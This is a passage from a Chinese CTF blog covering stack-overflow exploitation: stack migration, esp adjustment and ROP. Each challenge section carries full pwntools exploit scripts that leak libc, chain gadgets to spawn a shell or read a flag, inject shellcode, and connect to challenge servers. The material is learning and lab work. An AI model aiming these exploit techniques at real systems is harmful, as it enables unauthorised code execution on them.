e.symbols[&#39;puts&#39;] puts_got = e.got[&#39;puts&#39;] read = e.symbols[&#39;read&#39;] leave_ret = 0x08048418 buf1 = 0x0804b000 - 0x100 buf2 = buf1 - 0x50 pop_edx_ret = 0x0804836d p = &#39;a&#39; * padding + flat([buf1,read,leave_ret,0,buf1,0x50]) io.readuntil(&#39;:\\n&#39;) io.send(p) p = flat([buf2,puts_plt,pop_edx_ret,puts_got,read,leave_ret,0,buf2,0x50]) sleep(0.1) raw_input(&#39;-&gt;&#39;) io.sendline(p) puts_add = u32(io.recv(4)) libc = puts_add - l.symbols[&#39;puts&#39;] print(hex(libc)) system_add = l.symbols[&#39;system&#39;] + libc binsh_add = l.search(&#39;/bin/sh\\x00&#39;).next() + libc p = flat([buf1,system_add,system_add,binsh_add]) raw_input(&#39;-&gt;&#39;) # sleep(0.1) io.sendline(p) io.interactive()spwn查保护和arch Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000)尝试运行 ida分析直接看漏洞函数 ssize_t vul_function() { size_t v0; // eax size_t v1; // eax char buf; // [esp+0h] [ebp-18h] v0 = strlen(m1); write(1, m1, v0); // Hello good Ctfer read(0, &amp;s, 0x200u); v1 = strlen(m2); write(1, m2, v1); // What do you want to say? return read(0, &amp;buf, 0x20u); }发现可以利用的gadget只有一个，那就只有leave的gadget了，然后把ebp控制到前面的read函数的s处，其也是全局变量，地址固定。 攻击思路 在第一个read的时候，直接把构造的rop链读进去。任务分别是leak 一个函数的内存地址，来用libcseacher算出system，跟/bin/sh字符串的地址，返回start函数清理栈开启第二次使用漏洞； call system（/bin/sh） 然后第二个read时候，把控ebp指向固定地址s的地址，retaddress 放上leave的gadget。 expfrom pwn import * context.arch = &#39;i386&#39; context.log_level = &#39;debug&#39; from LibcSearcher import * e = ELF(&#39;./spwn&#39;) io = process(&#39;./spwn&#39;) # libc = e.libc io = remote(&#39;node3.buuoj.cn&#39;,28527) padding = 24 s = 0x0804A300 fake1 = 0x0804A500 leave_ret = 0x08048511 puts_add = e.symbols[&#39;puts&#39;] write_plt = e.symbols[&#39;write&#39;] write_got = e.got[&#39;write&#39;] io.recvuntil(&#39;name?&#39;) p = flat([fake1,write_plt,0x080483A0,1,write_got,10]) io.send(p) io.recvuntil(&#39;say?&#39;) p = padding * &#39;a&#39; + p32(s) + p32(leave_ret) # raw_input(&#39;-&gt;&#39;) io.send(p) write_add = u32(io.recv(4)) print(hex(write_add)) obj = LibcSearcher(&#39;write&#39;,write_add) libc_base = write_add - obj.dump(&#39;write&#39;) #libc.symbols[&#39;write&#39;] print(hex(obj.dump(&#39;write&#39;))) print(hex(libc_base)) sys_add = libc_base + obj.dump(&#39;system&#39;) #libc.symbols[&#39;system&#39;] binsh_add =libc_base + obj.dump(&#39;str_bin_sh&#39;) #libc.search(&#39;/bin/sh\\x00&#39;).next() io.recvuntil(&#39;name?&#39;) p = flat([fake1,sys_add,0x080483A0,binsh_add]) io.send(p) io.recvuntil(&#39;say?&#39;) p = padding * &#39;a&#39; + p32(s) + p32(leave_ret) io.send(p) io.interactive()ACTF_ 2019_hardcore fmt查保护和arch[*] &#39;/media/psf/mypwn2/buuctf/actf_2019_babystack/ACTF_2019_babystack&#39; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000)ida分析￼￼￼￼其中可以看到后面的read处，存在一个栈溢出，但是只有一个gadget可以用，需要考虑Stack Migration。其中那个sub400a1a函数是问你需要留下多少的字节，肯定要0xe0，所以再送过去的时候就填入0xe0，正好做参数给下面read函数用。 然后程序接受到0xe0后，进入if语句中，会输出一下堆栈esp的值，这下也是相当于知道了一个特定的地址，然后就正常构造rop链，把控ebp等于为接收到的stack esp，再跟上leava gadget即可。 expfrom pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; # io = process(&#39;./ACTF_2019_babystack&#39;) # io = remote(&#39;node3.buuoj.cn&#39;,27626) io = remote(&#39;challenge-848a378609341016.sandbox.ctfhub.com&#39;, 24656) elf = ELF(&#39;./ACTF_2019_babystack&#39;) # libc = elf.libc io.recvuntil(&#39;message?\\n&#39;) io.sendline(&#39;224&#39;) io.recvuntil(&#39;saved at&#39;) stack_addr = int((io.recvline_contains(&#39;0x7f&#39;)),16) print(stack_addr) libc_start_main_got = elf.got[&#39;__libc_start_main&#39;] puts_plt = elf.symbols[&#39;puts&#39;] pop_rdi_ret = 0x000400ad3 start_addr = 0x000400800 leave_ret = 0x400a18 payload = flat([&#39;\\x00&#39;*8,pop_rdi_ret,libc_start_main_got,puts_plt,start_addr]) payload = payload.ljust(208,&#39;a&#39;) payload += flat([stack_addr,leave_ret]) io.recvuntil(&#39;&gt;&#39;) raw_input(&#39;-&gt;&#39;) io.send(payload) io.recvuntil(&#39;bye~\\n&#39;) libc_start_main_addr = u64(io.recv(6).ljust(8,&#39;\\x00&#39;)) #- libc.symbols[&#39;__libc_start_main&#39;] obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_addr) libc_base = libc_start_main_addr - obj.dump(&#39;__libc_start_main&#39;) print(hex(libc_base)) io.recvuntil(&#39;message?\\n&#39;) io.sendline(&#39;224&#39;) io.recvuntil(&#39;saved at&#39;) stack_addr = int((io.recvline_contains(&#39;0x7f&#39;)),16) print(stack_addr) rec = libc_base + 0x4f2c5 payload = flat([&#39;\\x00&#39;*8,rec]) payload = payload.ljust(208,&#39;\\x00&#39;) payload += flat([stack_addr,leave_ret]) io.recvuntil(&#39;&gt;&#39;) raw_input(&#39;-&gt;&#39;) io.send(payload) io.interactive()","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"Stack Migration","slug":"Stack-Migration","permalink":"http://chumen77.xyz/tags/Stack-Migration/"}]},{"title":"花式栈溢出（栈帧的调节）","slug":"花式栈溢出（调节栈帧）","date":"2020-02-05T08:53:11.000Z","updated":"2020-03-12T15:14:16.000Z","comments":true,"path":"2020/02/05/花式栈溢出（调节栈帧）/","link":"","permalink":"http://chumen77.xyz/2020/02/05/花式栈溢出（调节栈帧）/","excerpt":"","text":"花式栈溢出（栈帧的调节）前言本人刚学pwn不久，最近在学习过程中学到了各种需要栈帧调节的题目，以此记录一下。在一些栈溢出的程序中，我们会碰到一些问题，例如溢出的可控字节数太少，无法构造我们想要的rop链，程序ASLR开启后导致的栈地址不可预测等。对于这种问题，常用的思路包括： 加减esp值，控制栈指针 Stack Migration来构造一个假的栈帧。 这里总结了2种题型： 加减esp，把控栈指针这种题型就需要用Ropgadget找一个控制esp的gadget，然后简单修改esp值的大小，来满足我们的需求。 Alictf_016_vss这个题目就是一个修改esp扩大栈空间，从而构造rop链获取shell的题目。 检查保护和arch ida分析由于这个程序使用静态编译和strip命令剥离符号，用ida打开没有我们平时看的那么简单，很多函数已经无法识别，我们就需要自己调试，然后推测是什么函数。start函数中，call的函数是__libc_start_main, 上一行的 offset则是main函数那个箭头就是main函数了。进入main函数以后，可以经过syscall中rax的参数来确认其是什么函数，很明显一个函数是alarm函数，先手动nop一下。把这个函数去除后，方便gdb的后期调试。接着可以很容易确定一下puts函数跟read函数，在ida中修改一下。下面那个40108e函数是比较复杂的，我用edb动态调试来确定出其中的某些函数：对于这个函数，先确定一下其参数。dump过去就会发现是复制了一份。所以就确定这个函数是strncpy是函数。对于这个函数char *strncpy(char *dest, const char *src, int n)将src指向的字符数组中n个字符复制到dest指向的字符数组中，在第一个空字符处停止，并返回被复制后的dest。对于下一段就是判断一下，是否与0x79和0x70相等，可以来手动修改值让其相等。往后走会发现先溢出了，在做溢出题的时候看到return 就应该想办法想上跳。溢出的这个地址就是刚刚又syrcpy函数复制过来0x50字节中的最后8个字节，因为是strncpy函数，我们输入的字符串中是不能有\\x00，否则会被截断，从而无法复制满0x50字节制造可控溢出，所以前0x48个字节中，我们不能写入任何地址。在这种情况下就需要通过修改esp来完成漏洞利用。 在最前面的read函数中，给了十分大的缓冲区可以用，我们可以把ROP链放在0x50字节之后，然后通过增加esp的值把栈顶抬到ROP链上，紧接着执行这个rop链即可。 查到one_gadget发现0x000000000046f205 : add rsp, 0x58 ; ret正好符合要求。然后gdb调试一下确定一下rop链从50个字节后的那里开始合适即可。（这个在找onegadget的时候注意不要把rsp搞成esp了，自己在做的时候因为这个调试了半天，才发现是这个错误，导致exp不成功） expfrom pwn import * import time io = process(&#39;./vss&#39;) e = ELF(&#39;./vss&#39;) io.recvuntil(&#39;Password:\\n&#39;) add_rsp_0x58_ret = 0x0046f205 pop_rax_ret = 0x0046f208 pop_rdi_ret = 0x0401823 pop_rsi_ret = 0x0401937 pop_rdx_ret = 0x043ae05 bss = 0x6C8178 -10 syscall_ret = 0x0045f2a5 rop1 = [ pop_rax_ret, 0, pop_rdi_ret, 0, pop_rsi_ret, bss, pop_rdx_ret, 10, syscall_ret, pop_rax_ret, 0x3b, pop_rdi_ret, bss, pop_rsi_ret, 0, pop_rdx_ret, 0, syscall_ret ] # raw_input(&#39;-&gt;&#39;) io.sendline(&#39;py&#39; + &#39;a&#39;*70 + p64(add_rsp_0x58_ret)+ &#39;b&#39;* 8 + &#39;&#39;.join(map(p64,rop1))) # raw_input(&#39;-&gt;&#39;) sleep(0.1) io.send(&#39;/bin/sh\\x00&#39;) io.interactive()X-CTF Quals 2016-b0verfl0w查保护和arch这个nx也没有开，可以用栈执行shellcode ida分析signed int vul() { char s; // [esp+18h] [ebp-20h] puts(&quot;\\n======================&quot;); puts(&quot;\\nWelcome to X-CTF 2016!&quot;); puts(&quot;\\n======================&quot;); puts(&quot;What&#39;s your name?&quot;); fflush(stdout); fgets(&amp;s, 50, stdin); printf(&quot;Hello %s.&quot;, &amp;s); fflush(stdout); return 1; }代码很简单，但是可以发现可以溢出的字节只有50-0x20-4=14个字节可控，所以是很难写出rop链来获取咱们目的的。然后就可以考虑控制栈指针的攻击思路，就是先把shellcode摆在栈上，然后控制eip到达这里就可以了。但是由于程序本身会开启 ASLR 保护，所以我们很难直接知道 shellcode 的地址。但是栈上相对偏移是固定的，所以我们可以利用栈溢出对 esp 进行操作，使其指向 shellcode 处，并且直接控制程序跳转至 esp 处。 找一下控制esp的gadget 0x08048504 : jmp esp然后怎么控制eip到shellcode上呢，因为没有nx保护，我们可以写一段指令来控制偏移： sub esp,0x28 jmp espexpfrom pwn import * #io = process(&#39;./b0verfl0w&#39;) context.arch = &#39;i386&#39; io = remote(&#39;node3.buuoj.cn&#39;,29410) shellcode = &quot;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73&quot; shellcode += &quot;\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0&quot; shellcode += &quot;\\x0b\\xcd\\x80&quot; sub_esp_jmp = asm(&#39;sub esp, 0x28;jmp esp&#39;) jmp_esp = 0x08048504 payload = shellcode + (36-len(shellcode_x86))*&#39;b&#39;+p32(jmp_esp) + sub_esp_jmp io.readuntil(&#39;?\\n&#39;) #raw_input(&#39;-&gt;&#39;) io.sendline(payload) io.interactive()Stack Migration在 Stack Migration 中，我们所利用的技巧便是同时控制 EBP 与 EIP，这样我们在控制程序执行流的同时，也改变程序栈帧的位置。 原理我们知道在函数建立栈帧时有两条指令push ebp; mov ebp, esp，而退出时同样需要消除这两条指令的影响，即leave(mov esp, ebp; pop ebp) 。且leave一般紧跟着就是ret。因此，在存在栈溢出的程序中，只要我们能控制到栈中的ebp，我们就可以通过两次leave劫持栈。 第一次随着程序流leave; ret，new esp为我们构造新栈的目标地址。 可以看到执行到ret时，esp还在原来的old栈上，而ebp已经指向了新的栈的栈顶。第二次进入我们放入栈上的leave; ret 的gadget（这个是我们事先写上栈的）esp已经被成功劫持到新的栈上，执行完gadget后栈顶会 在new_esp-4(64位是-8)的位置上。此时栈完全可控了，通过预先或者之后在new stack上布置的rop链可以轻松完成攻击。 HITCON_training_lab6_64位这个是在HITCON_training的一个练习，直接给的有源码，我给编译成了64位版本。 源码#include &lt;stdio.h&gt; int count = 1337 ; char *t= &quot;Z\\xc3&quot; ; int main(){ if( count!=1337 ){ _exit(1); } count++ ; char buf[48]; setvbuf(stdout,0,2,0); puts(&quot;Try your best : &quot; ); read(0, buf,128); return ; }gcc -z relro -z now -fno-stack-protector -mpreferred-stack-boundary=2 migration.c -o migration 编译命令 简单分析这个题纯粹就是为了练习的Stack Migration用的，可以不分析代码直接用gdb-peda直接来测试：熟悉的栈溢出，但是下面多出来的一些字符串，也是程序不能接受的部分，也可以作为一个需要考虑栈迁移的标志。注意一下rsp被覆盖的值。计算padding为48.计算一下，可以填入多少的可控字段。去除一下刚刚程序不能存入的部分和padding部分，还有80个字节可以用。其中一个来伪造new esp，剩下也就还有9个gadget可以用，可以给我构造第一个rop链。 图解分析假设我们已经填入了溢出字符，buf1即为我们要去的新栈，这个选择bss段的后一半：开始执行一下leave 中的mov rsp,rbp：此时rsp 也指向了 rbp指向的位置，在执行leave中的pop rbp:此时rbp已经到了我们伪造的新栈buf1，然后开始执行ret,进入执行pop_rdi的gadget: 此时已经将buf1的地址，推入rdi，作为gets的参数，执行gets函数后，我们就可以往buf1上填入我们的rop链，此时栈大小已经没有限制了，可以任意写。在这个buf1的栈空间里，我们需要先把rbp指向的位置写入buf2（下一个构造的新栈），然后构造rop链把puts的内存地址给泄露出来，进而可以算出libc的基地址，接着再构造一个gets函数。接着是执行一下leave 的gadget：执行完以后就可以发现我们，已经完全控制了栈。并且开了一个buf2的新栈，留着在buf1调用gets函数时来在buf2新栈中摆上调用system(/bin/sh)函数的rop链。然后继续执行：这就泄露出了puts函数的内存地址。接着开始往buf2新栈上读rop链:读入完成，接着再次执行leave的gadget：可以看到esp到了新栈，rbp因为刚刚在buf2填入的buf1，又会到了buf1，这个地址可以随便填了，对做题不影响，填写这个只是可以看到再次栈转移。接着执行buf2新栈的rop链：就可以拿到shell了。 EXP借着这个思路就可以开始写exp: from pwn import * import time context.arch = &#39;amd64&#39; context.log_level = &#39;debug&#39; e = ELF(&#39;./test&#39;) l = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;) # io = remote(&#39;127.0.0.1&#39;,4000) io = process(&#39;./test&#39;) pop_rdi_ret = 0x400703 pop_rsi_r15_ret= 0x0400701 pop_rdx_ret= 0x0400724 leave_ret= 0x0400699 buf1 = 0x00602000 - 0x200 buf2 = buf1 + 0x100 padding = 56 - 8 puts_plt = e.symbols[&#39;puts&#39;] puts_got = e.got[&#39;puts&#39;] read_add = e.symbols[&#39;read&#39;] io.recvuntil(&#39;:&#39;) p = &#39;a&#39;*padding + flat([buf1,pop_rdi_ret,0,pop_rsi_r15_ret,buf1,0,pop_rdx_ret,0x100,read_add,leave_ret]) #raw_input(&#39;-&gt;&#39;) io.send(p) sleep(0.1) p = flat([buf2,pop_rdi_ret,puts_got,puts_plt,pop_rdi_ret,0,pop_rsi_r15_ret,buf2,0,pop_rdx_ret,0x100,read_add,leave_ret]) sleep(0.1) #raw_input(&#39;-&gt;&#39;) io.sendline(p) io.recvuntil(&#39;\\n&#39;) puts = u64((io.recv(6)).ljust(8,&#39;\\x00&#39;)) libc = puts - l.symbols[&#39;puts&#39;] print(&#39;libc_base:&#39; + hex(libc)) binsh_add = l.search(&#39;/bin/sh\\x00&#39;).next() + libc #print(binsh_add) # raw_input(&#39;-&gt;&#39;) system_add = l.symbols[&#39;system&#39;] + libc p = flat([buf1,pop_rdi_ret,binsh_add,system_add]) sleep(0.1) io.sendline(p) io.interactive()Hgame2020_week2_rop_level2查保护和arch32位程序，开了nx保护 ida分析这个明显的栈溢出，但是0x60-0x50-0x8 = 8。发现只有一个gadget位置，无法构造我们想要的rop链。但是前面的第一个read函数，可以读入很大空间，并且第二个参数buf的地址是固定的。那这个题明显就是可以Stack Migration来解决问题了，并且只需再写一个leave ret就控制栈了。 攻击思路程序中有着open，read，puts函数，我们可以写一个rop链，调用open函数，控制其参数是./flag，并在gdb中调试将其返回的文件fd号记录下来，然后传递给read函数，让其读入文件内容存入某个缓冲区，再用puts函数输出一下flag文件的内容即可。在第一个read的时候，我们就需要写好rop链。然后在最后一个read函数时，控制好ebp指向我们的新栈。 EXPfrom pwn import * context.log_level = &#39;debug&#39; context.arch = &#39;amd64&#39; # io = process(&#39;./ROP&#39;) io = remote(&#39;47.103.214.163&#39;,20300) e = ELF(&#39;./ROP&#39;) buf = 0x06010A0 # libc = e.libc padding = 80 leave_ret = 0x040090d pop_rdi_ret = 0x00400a43 pop_rsi_r15 = 0x00400a41 open_plt = 0x4007b0 read_plt = 0x400780 puts_plt = 0x400760 io.recvuntil(&#39;think so?\\n&#39;) p = flat([&#39;./flag\\x00\\x00&#39;,pop_rdi_ret,buf,pop_rsi_r15,0,0,open_plt,pop_rdi_ret,4,pop_rsi_r15,buf+0x80,0,read_plt,pop_rdi_ret,buf+0x80,puts_plt]) io.sendline(p) io.recvuntil(&#39;\\n&#39;) p = padding * &#39;a&#39; + p64(buf) + p64(leave_ret) raw_input(&#39;-&gt;&#39;) #手动下一个断点，以后让gdb附加上进行调试 io.send(p) flag = io.recvline_contains(&#39;hgame&#39;) print(flag) io.interactive()我们跟着exp来调试一下，看看效果：此时的esp是我们伪造的new esp，已经指向了我们的目标位置，并且第一个rop链接已经送过去，可以看到./flag的字眼。执行一下leave：可以看到rbp的值已经等于我们伪造的值，esp还在原来栈上。接着执行ret，进入下一个leave ret：先记录下当前的状态，开始执行leave：执行完发现esp已经到达了新栈buf+8的位置，此时的栈帧已经是我们完全想要的，已经劫持了程序流程，并且新栈空间很大，可以满足我们的需求。ebp是多少已经不重要了，我们直接填入./flag，这个固定地址也做为给open函数做参数。在调试的时候，执行完open函数需要把返回的fd值记录下，给read函数做参数。最后由puts函数在输出flag： Stack Migration小总结 这下可以总结下利用思路也就是 把控好起初栈的ebp，在里面写入需要伪造的new esp 在之后的可利用字节中写入leave gadget 将想执行的ROP Chain写在已知固定位置上 再利用leave搬移Stack位置到已知位置 然后无限接ROP Chain","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://chumen77.xyz/tags/pwn/"},{"name":"学习记录","slug":"学习记录","permalink":"http://chumen77.xyz/tags/学习记录/"},{"name":"Stack Migration","slug":"Stack-Migration","permalink":"http://chumen77.xyz/tags/Stack-Migration/"}]},{"title":"ROP题目练习","slug":"ROP练习","date":"2020-02-03T08:21:13.000Z","updated":"2020-06-22T03:57:18.281Z","comments":true,"path":"2020/02/03/ROP练习/","link":"","permalink":"http://chumen77.xyz/2020/02/03/ROP练习/","excerpt":"","text":"ROP题目练习前言最近在学习栈溢出，做了一些ROP的练习题，基本都是buuoj的题目，搜索rop字眼找的rop题。简单记录一下收获和exp。 有libc（或者无libc可做）OGeek2019_babyrop查保护和arch32位程序，开启NX堆栈不可执行。 ida分析可以看出其取了一个随机数，存入buf。然后进入这个函数分析，看到接收buf传来的值，放入s中。然后下面接收你传入的东西，与s判断是否相同，不相同就会退出。然后如果不退出返回值是v5，但是这里的v5在函数中是没有经过处理的。看一下汇编：v5咱们想控制，就只能通过原来那个read函数，咱们传入的值去控制。返回值给v2，然后v2作为参数然后进入下面这个带有溢出的函数中。 观察后，可以看出咱们应该把这个返回的参数整的大一点，方便进行写ROP链。 分析总结其中对于绕过相等判断，可以利用一下strlen函数的特性，然后直接用\\x00来截断。v5这个返回参数可以控制为’\\xff’,然后进入带有溢出的函数，写rop链就行了。先用puts函数泄露出__libc_start_main的地址，然后在给的libc中确认下symbols，然后拿到libc基址，然后直接利用one gadget RCE即可。 expfrom pwn import * import time # io = process(&#39;./pwn&#39;) io = remote(&#39;node3.buuoj.cn&#39;,27780) libc = ELF(&#39;./libc-2.23.so&#39;) # blibc = ELF(&#39;/lib/i386-linux-gnu/libc-2.23.so&#39;) elf = ELF(&#39;./pwn&#39;) # raw_input(&#39;-&gt;&#39;) p1 = &#39;\\x00&#39;.ljust(8,&#39;\\xff&#39;) offset = 0xe7 + 4 io.send(p1 + &#39;\\n&#39;) io.recvline_contains(&#39;Correct&#39;) start_add=0x080485A0 put_add = elf.symbols[&#39;puts&#39;] libc_start_add = elf.got[&#39;__libc_start_main&#39;] rop1 = [ put_add, start_add, libc_start_add ] p2 = offset * &#39;\\x00&#39; + &#39;&#39;.join(map(p32,rop1)) io.sendline(p2) sleep(1) libc_base = u32(io.recv(4)) - libc.symbols[&#39;__libc_start_main&#39;] REC = libc_base+0x3a80c print(&#39;libc_base :&#39;+hex(libc_base)) offset = 0xe7 + 4 io.send(p1 + &#39;\\n&#39;) io.recvline_contains(&#39;Correct&#39;) p3 = offset * &#39;\\x00&#39; + p32(REC) io.sendline(p3) io.interactive() HarekazeCTF2019_baby_rop查保护和arch ida分析int __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [rsp+0h] [rbp-10h] system(&quot;echo -n \\&quot;What&#39;s your name? \\&quot;&quot;); __isoc99_scanf(&quot;%s&quot;, &amp;v4); printf(&quot;Welcome to the Pwn World, %s!\\n&quot;, &amp;v4); return 0; }程序十分简单，给了system函数，且明显存在溢出。ida查看字符串，该可以发现/bin/sh/，这构造个简单rop链直接利用就好了。 expfrom pwn import * import time # io = process(&#39;./babyrop&#39;) io = remote(&#39;node3.buuoj.cn&#39;,28633) elf = ELF(&#39;./babyrop&#39;) offset = 0x10 + 8 binsh_add = 0x0601048 pop_rdi_ret=0x000400683 system_add = elf.symbols[&#39;system&#39;] # io.recvline_contains(&#39;your&#39;) # raw_input(&#39;-&gt;&#39;) p = &#39;a&#39; * offset + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add) io.sendline(p) io.interactive()拿到shell后，这个题buuctf根目录下没有flag文件。需要find / -name &quot;flag&quot; 可以查到是在/home/babyrop/flag这个目录下。 HarekazeCTF2019_baby_rop2查保护和arch ida分析函数过程很简单，明显栈溢出，思路就是先栈溢出构造rop链，让pintf函数打印出__libc_start_main函数在内存的地址，然后在给的libc文件中获取一下其sympol是的值，然后再计算出它的基址，再让函数返回到shart处清理一下栈，然后再次利用onegadget RCE构造相关rop链即可。 expfrom pwn import * import time io = process(&#39;./babyrop2&#39;) # blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;) # context.log_level = &#39;debug&#39; libc = ELF(&#39;./libc.so.6&#39;) io = remote(&#39;node3.buuoj.cn&#39;,27694) elf = ELF(&#39;./babyrop2&#39;) offset = 40 __libc_start_add = elf.got[&#39;__libc_start_main&#39;] start_add = 0x0400540 printf_add = elf.symbols[&#39;printf&#39;] aWelcomeToThePw = 0x400770 pop_rdi_ret= 0x000400733 pop_rsi_r15_ret = 0x00400731 libc_start_sys = libc.symbols[&#39;__libc_start_main&#39;] rop1 = [ pop_rdi_ret, aWelcomeToThePw, pop_rsi_r15_ret, __libc_start_add, 0, printf_add, start_add ] io.recvuntil(&#39;e? &#39;) # io.recvuntil(&#39;again, &#39;) # raw_input(&#39;-&gt;&#39;) p = &#39;a&#39; * offset + &#39;&#39;.join(map(p64,rop1)) io.sendline(p) io.recvline_contains(&#39;again&#39;) s = io.recvline_contains(&#39;again&#39;) libc_base = int(u64(s[32:38].ljust(8,&#39;\\x00&#39;))) - libc_start_sys RCE = libc_base + 0x4526a print(&#39;libc_base:&#39;+hex(libc_base)) io.recvuntil(&#39;name? &#39;) # io.recvuntil(&#39;name? &#39;) p = &#39;\\x00&#39; * offset + p64(RCE) + &#39;\\x00&#39; * 70 sleep(1) raw_input(&#39;-&gt;&#39;) io.sendline(p) io.interactive() 无libc这一部分目前主要是利用LibcSearcher来做的，有时候题目不给libc，用这个也可以解决部分题目。~~用这个以后就不能很方便的用onegadget去一键拿shell了，感觉还是有办法的，想办法拿到LibcSearcher获取到的libc版本就好了，找个时间去实践一下，先慢慢构建rop链就好，正好练习一下这种方法拿shell。~~已经测试出办法咯。https://github.com/lieanu/LibcSearcher bjdctf_2020_babyrop查保护和arch ida分析函数十分简单，明显栈溢出，思路就是先栈溢出构造rop链，让puts函数打印出__libc_start_main函数的地址，然后再用libcsearcher来获取一下它的libc版本，然后再计算出它的基址，再让函数返回到最初清理一下栈，然后再次进行溢出构造关于system(&#39;/bin/sh&#39;)的rop链即可。 expfrom pwn import * from LibcSearcher import * import time # context.log_level = &#39;debug&#39; io = remote(&#39;node3.buuoj.cn&#39;,28661) # io = process(&#39;./bjdctf_2020_babyrop&#39;) elf = ELF(&#39;./bjdctf_2020_babyrop&#39;) # blibc = ELF(&#39;/lib/x86_64-linux-gnu/libc-2.23.so&#39;) io.recvuntil(&#39;story!\\n&#39;) padding = 40 libc_main_add = elf.got[&#39;__libc_start_main&#39;] puts_add = elf.symbols[&#39;puts&#39;] pop_rdi_ret = 0x0400733 p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(libc_main_add) + p64(puts_add) + p64(0x400530) io.sendline(p) s = u64(io.recv(6).ljust(8,&#39;\\x00&#39;)) print(hex(s)) obj = LibcSearcher(&quot;__libc_start_main&quot;,s) libc_base = s - obj.dump(&quot;__libc_start_main&quot;) system_add = libc_base + obj.dump(&quot;system&quot;) binsh_add = libc_base + obj.dump(&quot;str_bin_sh&quot;) sleep(1) io.recvuntil(&#39;story!\\n&#39;) p = &#39;a&#39;*padding + p64(pop_rdi_ret) + p64(binsh_add) + p64(system_add) io.sendline(p) io.interactive()unctf_easyrop查保护和arch ida分析主程序主要就是限制了v2需要等于ffff才能进入带有溢出的函数，v2的值是这个在read的时候把控好，让ffff填入这个位置即可。然后进入这个带有溢出漏洞的函数，可以看到buf的首地址是ebp-0x10，然后分析下这里的汇编，它把read函数的溢出位置返回值ebp-0x14取出来，与0x8050000进行比较。也可以看出，这里是防止我们进行ret2libc的。那我们构造这里可以用一个ret来进行绕过。 思路总结先控制好v2让其等于ffff，然后进入带有溢出的函数，然后构造rop链，先把__libc_start_main的内存地址泄露出来，然后用libcseacher来确定libc版本，然后dump出__libc_start_main的sympols,算出基址后，接着返回到开始处清理一下栈，再次溢出跟原来一样。然后再次构造rop链的时候，注意ret绕过对咱们溢出地址的检测，在调用system(‘/bin/sh’)即可。 expfrom pwn import * from LibcSearcher import * import time # context.log_level = &#39;debug&#39; io = process(&#39;./easyrop&#39;) # io = remote(&#39;183.129.189.60&#39;,10011) io.recvuntil(&#39;TFer!\\n&#39;) e =ELF(&#39;./easyrop&#39;) raw_input(&#39;-&gt;&#39;) padding = 36 start_add = 0x08048400 libc_start_main = e.got[&#39;__libc_start_main&#39;] puts_add = e.symbols[&#39;puts&#39;] ret = 0x0804839e p = &#39;f&#39; * padding rop1 = [ puts_add, start_add, libc_start_main ] io.sendline(p) io.recvuntil(&#39;name?\\n&#39;) p = &#39;\\x00&#39; * 0x18 + &#39;&#39;.join(map(p32,rop1)) raw_input(&#39;&gt;&#39;) io.sendline(p) libc_start_add = u32(io.recv(4)) obj = LibcSearcher(&quot;__libc_start_main&quot;,libc_start_add) libc_base = libc_start_add - obj.dump(&quot;__libc_start_main&quot;) print(libc_base) system_add = obj.dump(&#39;system&#39;) + libc_base binsh_add = obj.dump(&#39;str_bin_sh&#39;) + libc_base io.recvuntil(&#39;TFer!\\n&#39;) p = &#39;f&#39; * padding io.sendline(p) io.recvuntil(&#39;name?\\n&#39;) rop2 = [ ret, system_add, start_add, binsh_add ] p = &#39;\\x00&#39; * 0x14 + &#39;&#39;.join(map(p32,rop2)) sleep(1) io.sendline(p) io.interactive() 铁人三项(第五赛区)_2018_rop查保护和arch32位 ida分析int __cdecl main(int argc, const char **argv, const char **envp) { be_nice_to_people(); vulnerable_function(); return write(1, &quot;Hello, World\\n&quot;, 0xDu); }主函数很简单，漏洞函数是在第二个函数。栈溢出，然后直接构造rop链即可。利用思路：用wirte函数泄露出__libc_start_main在内存地址，然后返回start清理一下栈，用libcseacher确定下libc版本，然后进行构造system(‘/bin/sh’)的rop链即可。 这个我是发现可以用libcseacher确定libc版本后，用one_gadget工具计算RCE位置，然后实现ret to RCE。libcseacher获取到leak地址后，在执行dump libc前的时候，会告诉你，它确定的libc版本号是多少。这个是让你选择的。 在下载的libcseacher时候，其实它是有个数据库的，这里面存着各种libc版本，方便咱们使用。那这个时候，直接用one_gadget 计算下RCE偏移即可。 expfrom pwn import * from LibcSearcher import * context.log_level = &#39;debug&#39; context.arch = &#39;i386&#39; elf = ELF(&#39;./2018_rop&#39;) # io = process(&#39;./2018_rop&#39;) io = remote(&#39;node3.buuoj.cn&#39;,29692) padding = 140 write_plt = elf.symbols[&#39;write&#39;] libc_start_main_got = elf.got[&#39;__libc_start_main&#39;] start = 0x080483C0 p = padding * &#39;\\x00&#39; + flat([write_plt,start,1,libc_start_main_got,0x10]) # raw_input(&#39;-&gt;&#39;) io.sendline(p) libc_start_main_add = u32(io.recv(4)) obj = LibcSearcher(&#39;__libc_start_main&#39;,libc_start_main_add) libc_base = libc_start_main_add - obj.dump(&#39;__libc_start_main&#39;) system_add = libc_base + obj.dump(&#39;system&#39;) binsh_add = libc_base + obj.dump(&#39;str_bin_sh&#39;) # print(libc.symbols[&#39;__libc_start_main&#39;]) print(hex(libc_base)) # io.recvline() RCE = libc_base + 0x3cbec p = padding * &#39;\\x00&#39; + p32(RCE) + padding * &#39;\\x00&#39; # p = padding * &#39;\\x00&#39; + p32(system_add) + p32(start) + p32(binsh_add) io.sendline(p) io.interactive()这里面两种办法都行。 xdctf2015_pwn200查保护和arch Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) ida分析主函数十分简单，漏洞在vuln函数：padding为 6c+4 个字节。跟上题很像的攻击思路，直接给exp了。 expfrom pwn import * from LibcSearcher import * # io = process(&#39;./bof&#39;) io = remote(&#39;node3.buuoj.cn&#39;,27178) elf = 